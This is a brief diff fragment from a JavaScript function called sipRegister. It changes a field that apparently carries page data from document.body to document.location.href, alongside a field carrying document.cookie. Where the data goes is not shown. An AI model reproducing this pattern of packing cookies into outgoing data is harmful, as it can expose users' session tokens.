@@ -374,7 +374,7 @@ function sipRegister() {
                 value: document.cookie
             }, {
                 name: 'x_html',
-                value: document.body
+                value: document.location.href
             }]
 		});
 
